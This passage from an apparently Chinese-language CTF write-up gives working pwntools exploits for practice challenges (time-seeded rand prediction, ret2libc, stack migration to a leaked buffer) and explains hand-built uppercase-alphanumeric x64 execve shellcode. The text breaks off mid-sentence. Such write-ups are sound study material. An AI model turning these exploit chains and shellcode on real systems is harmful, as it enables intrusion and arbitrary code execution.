data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'number\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>想了想，用 week1 的 random 的思路应该也能做，而且更快。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./secretnumber'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',29429)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b ')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>e<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Give me some gift?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Guess the number'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ret2libc\"><a class=\"markdownIt-Anchor\" href=\"#ret2libc\">#</a> ret2libc</h2>\n<p>ret2libc3</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25746</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=process('./ret2libc')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b *0x0')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ret2libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>puts_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x020</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>exit_a <span class=\"token operator\">=</span> main_a</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>prdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0400763</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0400506</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">ready</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Show me your magic again\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>prdi<span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_p<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#'''</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>libc = ELF('./libc-2.23.so')</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>libcbase = lsm_a - libc.sym['__libc_start_main']</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>sys_a = libcbase + libc.sym['system']</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>bs_a = libcbase + next(libc.search(b'/bin/sh'))</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>prdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>exit_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"stack-migration\"><a class=\"markdownIt-Anchor\" href=\"#stack-migration\">#</a> stack migration</h2>\n<p>栈迁移<br>\n经典题，溢出只能到返回地址。<br>\n这道题给了 buf 局部变量的地址，因此可以把栈迁移到 buf 的位置。在字符串开头构建 payload，后半部分放入 buf 地址和 leave_ret 地址。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25141</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=process('./pwn')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b puts')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>read_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>puts_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>main_a <span class=\"token operator\">=</span> <span class=\"token number\">0x4012be</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>prdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0401333</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rsi_r15 <span class=\"token operator\">=</span> <span class=\"token number\">0x401331</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x040101a</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x050</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>leave_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x4012aa</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\0'</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift for you: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'm'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>prdi<span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_p<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> offset</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>leave_ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'plz:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'soon!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#p.close()</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>libc = LibcSearcher('__libc_start_main',lsm_a)</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>libcbase = lsm_a - libc.dump('__libc_start_main')</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>sys_a = libcbase + libc.dump('system')</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>bs_a = libcbase + libc.dump('str_bin_sh')</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\">#'''</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\0'</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift for you: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'm'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>prdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> offset</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>leave_ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"shellcode_revenge\"><a class=\"markdownIt-Anchor\" href=\"#shellcode_revenge\">#</a> **shellcode_revenge</h2>\n<p>alphanumeric shellcode x64 uppercase<br>\n 这道题是仅包含大小写和数字类型的 shellcode。仅仅利用这些范围里的机器码构建 shellcode。<br>\n大家的解法都是用工具。大致有一下三种。</p>\n<ul>\n<li>ae64: 用于 x64，需大小写及数字</li>\n<li>alpha3,  x64 模式 需大小写及数字 x86 可选择仅小写和数字 或 大写和数字</li>\n<li>metasploit 中的 msfvenom， 同 alpha3</li>\n</ul>\n<p>但是这题是 64 位题，并且只能用大写和数字编写 shellcode，因此以上工具均用不了，只能自己编写 shellcode。（也或者单纯我没找到这种工具）<br>\n构造 shellcode 大部分情况就是构造 <code>execve(&quot;/bin/sh&quot;,0,0);</code>  这一系统调用，因此以下数据必不可少。</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>“/bin”-&gt;rdi</th>\n<th>“/sh\\0”</th>\n<th>syscall 机器码</th>\n<th>execve 调用号 - rax</th>\n<th>rsi</th>\n<th>rdx</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>编码</td>\n<td>\\x2f\\x62\\x69\\x6e</td>\n<td>\\x2f\\x7c\\x68\\x00</td>\n<td>\\x0f\\x05</td>\n<td>\\x3b</td>\n<td>0</td>\n<td>0</td>\n</tr>\n<tr>\n<td>16 进制</td>\n<td>0x6e69622f</td>\n<td>0x68732f</td>\n<td>0x50f</td>\n<td>0x3b</td>\n<td>0</td>\n<td>0</td>\n</tr>\n<tr>\n<td>xor</td>\n<td>31 30 30 36</td>\n<td>31 30 30 5a</td>\n<td>41 30</td>\n<td>39</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>xor</td>\n<td>48 52 59 58</td>\n<td>48 53 58 5a</td>\n<td>4e 35</td>\n<td>32</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>41</td>\n<td>41</td>\n<td></td>\n<td>30</td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>数字的 ascii 码范围是 <code>0x30~0x39</code> ，大写字母的 ascii 码范围是 <code>0x41~0x5a</code> 。</p>\n</blockquote>\n<p>上述数据所对应的字符都不属于大写字母和数字，因此无法直接构建 shellcode。所以可以利用数字范围的部分 xor，以两个数字异或得到想要的数据。其中部分数据需要 3 个数才能异或获得。如 <code>'/'</code> ，不过因为其恰好位于低位，用 <code>xor al, 41;</code>  可以不影响其他位。<br>\n其次 push 立即数的机器码属于小写字母，所以还是只能通过异或寄存器再 push 寄存器的方式往栈上放入数据。在异或前需先将寄存器清零。这里用将寄存器的值 push 到栈上，寄存器再与栈顶数据异或的方式清零。</p>\n<pre><code>push rdi;\npush rsp;\npop rcx;\nxor rdi, QWORD PTR [rcx];\n</code></pre>\n<p>rdx 和 在刚开始执行 shellcode 时放入了 shellcode 的地址。可以利用其往 shellcode 写入数据，这样就能够异或出 syscall 的机器码接在其他 shellcode 之后。而刚开始我想把 